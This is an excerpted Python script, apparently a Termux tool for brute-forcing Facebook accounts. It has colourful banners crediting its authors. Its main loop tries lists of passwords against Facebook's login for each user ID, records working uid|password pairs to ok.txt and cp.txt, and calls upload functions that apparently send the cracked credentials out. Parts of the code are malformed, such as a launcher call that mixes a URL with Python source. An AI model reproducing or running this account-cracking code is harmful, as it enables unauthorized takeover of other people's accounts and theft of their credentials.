...
def helpnote():
    ...
    subprocess.check_output(["am", "start", "plr = requests.get('https://github.com/AYUSH-HEROO/aprove/blob/main/aproval.txt"])
    exit(" [*] FACEBOOK :  SM9RTY AYUSH K1NG ")
...
def notice():
    ...
    subprocess.check_output(["am", "start", "https://wa.link/vk60sz"])
...
#            exit()
        os.system("clear")
        dark("\n \033[1;91m[>] \033[1;96mOPEN SOURCED BY - \033[1;95m@DARK_LMNx999 ")
        print ("""\033[1;92m   
┌────────────────────────────┐
│   \ \ \  / |  |   __|  |  |│
│  _ \ \  /  |  | \__ \  __ |│
...
└────────────────────────────┘
\033[1;90m═════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK  : SM9RTY AYUSH K1NG 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB    : SM9RTY AYUSH K1NG 
...
\033[1;90m═════════════════════════════════════════════════""")
        ...
        print("%s [%s•%s] %sVERSION   : %s4.7"%(G,R,G,B,G))
        print("\033[1;91m [\033[1;94m•\033[1;91m] \033[1;92mYOUR KEY  :\033[1;91m FUCKED BY LMNx9")
        print("\033[1;90m═════════════════════════════════════════════════")
...
#            notice()
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write(
            "\r\r %s[>_] [SUCCESSFUL_OLD] : %s/%s ->\033[0;92m [OK:%s] \033[0;91m[CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
        ); sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                print("\r \033[0;92m[SUCCESSFUL-OK] %s|%s\033[0;97m         "%(uid, pw))
                self.ok.append("%s|%s"%(uid, pw))
                open("ok.txt","a").write(" [SUCCESSFUL-OK] %s|%s\n"%(uid, pw))
                uploadoks()
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;91m[SUCCESSFUL-CP] %s|%s\033[0;97m         "%(uid, pw))
                self.cp.append("%s|%s"%(uid, pw))
                open("cp.txt","a").write(" [SUCCESSFUL-CP] %s|%s\n"%(uid, pw))
                uploadcps()
                break
            else:
                continue
